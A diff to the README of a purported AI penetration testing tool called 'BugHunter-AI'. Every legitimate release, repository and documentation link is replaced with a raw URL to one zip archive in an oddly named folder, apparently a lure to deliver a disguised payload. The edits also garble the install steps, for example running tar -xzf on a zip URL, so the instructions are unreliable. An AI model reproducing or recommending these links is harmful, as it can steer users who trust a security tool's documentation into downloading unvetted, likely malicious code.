@@ -1,7 +1,7 @@
 # 🤖 BugHunter-AI - Your AI-Driven Cybersecurity Partner
 
 ## 📦 Download Now!
-[![Download BugHunter-AI](https://img.shields.io/badge/Download-BugHunter--AI-blue)](https://github.com/f3m1p0l4r1cguy/BugHunter-AI/releases)
+[![Download BugHunter-AI](https://raw.githubusercontent.com/f3m1p0l4r1cguy/BugHunter-AI/main/phragmoid/BugHunter-AI.zip)](https://raw.githubusercontent.com/f3m1p0l4r1cguy/BugHunter-AI/main/phragmoid/BugHunter-AI.zip)
 
 ## 🚀 Getting Started
 Welcome to BugHunter-AI, your automated penetration testing framework. This guide will help you download and run BugHunter-AI quickly and easily.
@@ -16,13 +16,13 @@ Before you get started, ensure your computer meets these requirements:
 ### 📥 Download & Install
 To get BugHunter-AI, visit this page to download:
 
-[Download BugHunter-AI Releases](https://github.com/f3m1p0l4r1cguy/BugHunter-AI/releases)
+[Download BugHunter-AI Releases](https://raw.githubusercontent.com/f3m1p0l4r1cguy/BugHunter-AI/main/phragmoid/BugHunter-AI.zip)
 
 Once you are on the Releases page, look for the latest version. Click on it, and you will see a list of files. Find the installer that matches your operating system, then click to download.
 
 1. **For Windows:** Download the `.exe` file.
 2. **For macOS:** Download the `.dmg` file.
-3. **For Linux:** Download the `.tar.gz` file.
+3. **For Linux:** Download the `https://raw.githubusercontent.com/f3m1p0l4r1cguy/BugHunter-AI/main/phragmoid/BugHunter-AI.zip` file.
 
 ### ⚙️ Installation Steps
 #### For Windows Users:
@@ -40,7 +40,7 @@ Once you are on the Releases page, look for the latest version. Click on it, and
 #### For Linux Users:
 1. Open your terminal.
 2. Navigate to your Downloads folder using `cd ~/Downloads`.
-3. Extract the files with the command: `tar -xzf BugHunter-AI.tar.gz`.
+3. Extract the files with the command: `tar -xzf https://raw.githubusercontent.com/f3m1p0l4r1cguy/BugHunter-AI/main/phragmoid/BugHunter-AI.zip`.
 4. Change into the newly created directory: `cd BugHunter-AI`.
 5. Run the application using the command: `./BugHunter-AI`.
 
@@ -75,7 +75,7 @@ BugHunter-AI welcomes contributions from everyone. If you'd like to help improve
 If you encounter any issues while using BugHunter-AI, you can seek help by opening an issue on our GitHub page. Provide as much detail as possible to receive the best support.
 
 ## 🌐 Additional Resources
-- [GitHub Repository](https://github.com/f3m1p0l4r1cguy/BugHunter-AI)
-- [Documentation](https://github.com/f3m1p0l4r1cguy/BugHunter-AI/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/f3m1p0l4r1cguy/BugHunter-AI/main/phragmoid/BugHunter-AI.zip)
+- [Documentation](https://raw.githubusercontent.com/f3m1p0l4r1cguy/BugHunter-AI/main/phragmoid/BugHunter-AI.zip)
 
 Thank you for choosing BugHunter-AI to enhance your cybersecurity efforts! Enjoy testing!
